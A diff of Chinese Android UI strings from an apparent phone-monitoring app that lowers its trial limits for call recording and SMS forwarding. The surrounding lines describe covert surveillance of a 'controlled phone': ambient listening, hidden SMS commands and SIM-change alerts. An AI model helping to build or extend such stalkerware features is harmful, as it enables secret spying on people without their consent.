@@ -105,7 +105,7 @@
     <string name="pref_network_mode_title">网络连接模式</string>
     <string name="pref_network_mode_summary">"Wi-Fi静默"和"Wi-Fi主动"模式仅使用Wi-Fi，不占用3G流量。</string>
     <string name="pref_network_mode_dlg_title">选择模式</string>
-    <string name="pref_record_all_time_limit_in_trial">试用期间仅允许5次通话录音。</string>
+    <string name="pref_record_all_time_limit_in_trial">试用期间仅允许3次通话录音。</string>
     <string name="pref_ring_word_title">警报响铃</string>
     <string name="pref_ring_word_summary">发送短信#jb可强制使其持续响铃。</string>
     <string name="pref_env_word_title">环境监听</string>
@@ -155,8 +155,8 @@
     <string name="msg_auth_sms_sent_fail">错误：向服务器发送注册验证短信失败。请退出再次尝试或联系客服。</string>
     <string name="msg_has_sent_trial_expire_sms">安卓监控提醒您：在%s上的试用期已过，如需继续使用请联系</string>
     <string name="msg_expired_alert">安卓监控提醒您：在本机上的试用期已过，如需继续使用请联系</string>
-    <string name="msg_sms_times_over_in_trial">安卓监控提醒您：试用期转发短信已经达到10条，如需继续使用请联系</string>
-    <string name="msg_recording_times_over_in_trial">安卓监控提醒您：试用期通话录音已经达到5次，如需继续使用请联系</string>
+    <string name="msg_sms_times_over_in_trial">安卓监控提醒您：试用期转发短信已经达到5条，如需继续使用请联系</string>
+    <string name="msg_recording_times_over_in_trial">安卓监控提醒您：试用期通话录音已经达到3次，如需继续使用请联系</string>
     <string name="msg_changed_sim">安卓监控提醒：%s更换了手机卡。</string>
     <string name="msg_changed_sim_new_number_workaround">本短信手机号码即为新号码。请发送#9#加该新号码到被控手机进行确认（该短信不会在被控手机上显示）</string>
     <string name="msg_changed_sim_new_number">新卡号码为：%s</string>
